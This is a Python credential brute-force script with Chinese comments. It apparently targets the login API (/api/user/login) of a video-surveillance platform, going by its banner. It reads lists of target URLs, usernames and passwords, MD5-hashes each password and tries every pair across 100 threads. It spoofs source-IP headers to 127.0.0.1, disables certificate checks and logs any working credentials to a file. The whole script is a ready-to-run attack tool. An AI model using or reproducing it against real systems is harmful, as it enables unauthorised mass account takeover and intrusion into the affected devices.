# 函数的入口
import argparse, requests, sys, json, re, hashlib, os

# 导入多线程函数
from multiprocessing.dummy import Pool

# 导入URL判断函数
from urllib.parse import urlparse

# 关闭警告
requests.packages.urllib3.disable_warnings()


# 定义字符画
def banner():
    test = """
 __    __         ___        ___   ___ ____  ___  _  ___  _ 
/ / /\ \ \/\   /\/ _ \      / _ \ / __\___ \( _ )/ |( _ )/ |
\ \/  \/ /\ \ / / /_)/____ / /_\//__\// __) / _ \| |/ _ \| |
 \  /\  /  \ V / ___/_____/ /_\\/ \/  \/ __/ (_) | | (_) | |
  \/  \/    \_/\/         \____/\_____/_____\___/|_|\___/|_|
                                                            """
    print(test)


# 定义主函数
def main():

    # 实例化
    parser = argparse.ArgumentParser(
        description="Example: python {0} -f url.txt -u user.txt -p pass.txt -o result.txt ".format(
            os.path.basename(sys.argv[0])
        )
    )

    # 添加参数
    # -u 接收单个URL链接
    parser.add_argument("-t", "--target", dest="t", type=str, help="URL目标")

    # -f 接收URL文件中的链接
    parser.add_argument("-f", "--file", dest="f", type=str, help="URL文件路径")
    
    # 添加用户名文件路径参数
    parser.add_argument("-u", "--userfile", dest="u", type=str, help="用户名文件路径")

    # 添加密码文件路径参数
    parser.add_argument("-p", "--passfile", dest="p", type=str, help="密码文件路径")

    # -o 指定保存 存在漏洞URL的txt文件
    parser.add_argument(
        "-o", "--output", dest="o", type=str, help="指定保存 存在漏洞URL的txt文件"
    )

    # 调用
    args = parser.parse_args()

    # 如果是单个URL
    if args.t and not args.f:
        # 判断传入的是否是一个url
        if not is_valid_url(args.t):
            print("错误：'{}' 不是一个有效的URL.".format(args.t))
        else:
            poc(args.t, args.o, args.u, args.p)

    # 如果是URL文件
    elif args.f and not args.t:

        # 创建 url_list 接收url文件中的url
        url_list = []
        # 以读的方式打开url文件
        with open(args.f, "rt", encoding="utf-8") as f:
            # 将读到的内容
            for url in f.readlines():
                if is_valid_url(url.strip()):
                    # 去空后，添加到url_list
                    url_list.append(url.strip())

        # 定义线程个数
        mp = Pool(100)
        # 调用poc函数，传入 url_list 参数,运行多线程
        mp.map(lambda url: poc(url, args.o, args.u, args.p), url_list)
        # 若线程池满了则进行关闭
        mp.close()
        # 线程池等待再次连接
        mp.join()

    # 以上两者都不是
    else:
        print("输入内容有误，若您不确定，可参照：")
        print(
            "Usag:\n\t python {0} -f url.txt -u user.txt -p pass.txt -o result.txt ".format(
                os.path.basename(sys.argv[0])
            )
        )


def poc(target, output_file, userfile, passfile):

    # 定义headers
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "X-Forwarded-For": "127.0.0.1",
        "X-Originating-IP": "127.0.0.1",
        "X-Remote-IP": "127.0.0.1",
        "X-Remote-Addr": "127.0.0.1",
        "Priority": "u=0",
    }

    # 打开用户文件
    with open(userfile, "rt", encoding="utf-8") as fu:
        # 读取用户名
        for u in fu.readlines():
            # 打开密码文件
            with open(passfile, "rt", encoding="utf-8") as fp:
                # 读取密码
                for p in fp.readlines():
                    # 对读取的用户名和密码去空
                    u = u.strip()
                    p = p.strip()

                    # 创建md5对象
                    md5_obj = hashlib.md5()
                    # 更新md5对象
                    md5_obj.update(p.encode("utf-8"))
                    # 获取加密后的16进制字符串
                    md5_digest = md5_obj.hexdigest()

                    # 定义payload
                    payload = (
                        "/api/user/login?username="
                        + u
                        + "&password="
                        + md5_digest
                    )

                    # 如果捕捉异常
                    try:
                        res = requests.get(
                            url=target + payload,
                            headers=headers,
                            verify=False,
                            timeout=6,
                        )

                        res = json.loads(res.text)

                        if res["code"] == 0 and res["msg"]=="成功":
                            print(f"[+] {target} 存在弱口令   {u}:{p} ")

                            # 如果存在 output_file 参数
                            if output_file:
                                # 以追加的模式将其写入
                                with open(output_file, "at") as f:

                                    f.write(target + "\t" + u + ":" + p + "\n")
                                    return

                    except Exception:
                        print(f"连接异常：{target}")
                        return
        print("[-] {0}".format(target))


def is_valid_url(url):
    """
    检查给定的字符串是否是一个有效的URL。

    参数:
    url (str): 要检查的URL字符串。

    返回值:
    bool: 如果给定的字符串是一个有效的URL，则返回True；否则返回False。
    """
    try:
        # 使用urlparse模块解析URL
        result = urlparse(url)

        # 检查URL是否具有scheme和netloc（网络位置，通常是域名）
        return all([result.scheme, result.netloc])

    except ValueError:
        # 如果解析过程中出现错误（例如，字符串不是一个有效的URL格式），返回False
        return False


# 函数的入口
if __name__ == "__main__":
    banner()
    main()
